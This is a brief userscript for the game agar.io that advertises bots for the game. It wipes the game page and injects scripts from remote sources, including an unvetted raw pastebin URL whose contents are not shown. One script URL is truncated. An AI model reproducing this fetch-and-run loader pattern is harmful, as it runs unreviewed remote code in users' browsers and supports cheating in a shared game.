// ==UserScript==
// @name Vario Bots
// @version 3
// @namespace File
// @description Agar.io Bots
// @author Vario
// @match http://agar.io/*
// @run-at document-start
// ==/UserScript==

function loadScript(a){var b=document.createElement("script");b.type="text/javascript",b.src=a,document.head.appendChild(b)}function stopPage(){window.stop(),document.documentElement.innerHTML=null}"/"==location.pathname?(stopPage(),location.href="http://agar.io/VarioBots"+location.hash):"/VarioBots"==location.pathname&&(stopPage(),loadScript("https://code.jquery.com/jquery-3.1.0...."),loadScript("https://cdn.socket.io/socket.io-1.4.5.js"),loadScript("http://pastebin.com/raw/MSMfcMzU/js?v="+Math.floor(1e10*Math.random()+1)));
